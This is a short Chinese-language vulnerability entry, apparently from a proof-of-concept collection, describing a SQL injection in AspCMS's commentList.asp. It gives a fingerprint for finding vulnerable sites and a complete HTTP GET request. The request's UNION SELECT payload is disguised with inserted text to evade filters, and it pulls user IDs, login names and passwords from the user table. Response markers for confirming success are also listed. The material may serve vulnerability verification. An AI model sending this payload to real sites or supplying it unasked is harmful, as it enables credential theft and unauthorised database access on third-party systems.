﻿# AspCMS commentList.asp SQL注入漏洞

> 更新时间：2024-04-23

> 漏洞编号：

> 漏洞说明：AspCMS commentList.asp接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

> 漏洞特征：app="ASPCMS"

> 验证脚本：HTTP

```
GET /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：UserID

> 上传文件定位：

> 验证文件来源：AspCMS commentList.asp SQL注入漏洞.poc

